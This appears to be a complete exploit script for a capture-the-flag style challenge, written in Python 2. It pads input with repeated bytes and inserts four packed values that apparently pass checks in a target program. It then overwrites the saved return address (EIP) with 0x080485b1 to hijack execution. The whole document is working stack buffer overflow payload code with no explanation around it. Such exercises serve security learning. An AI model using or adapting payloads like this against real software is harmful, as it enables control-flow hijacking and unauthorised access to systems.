import struct
test1 = "\x41" * 229
answer1 = struct.pack("I", 0x5b0aeb93);
test2 = "\x42" * 237
answer2 = struct.pack("I", 0x434a5c2c);
test3 = "\x43" * 174
answer3 = struct.pack("I", 0x08108164);
test4 = "\x44" * 68
answer4 = struct.pack("I", 0xabdc4f01);

pad = "\x41" * 447
EIP = struct.pack("I", 0x080485b1);
print test1 + answer1 + test2 + answer2 + test3 + answer3 + test4 + answer4 + pad + EIP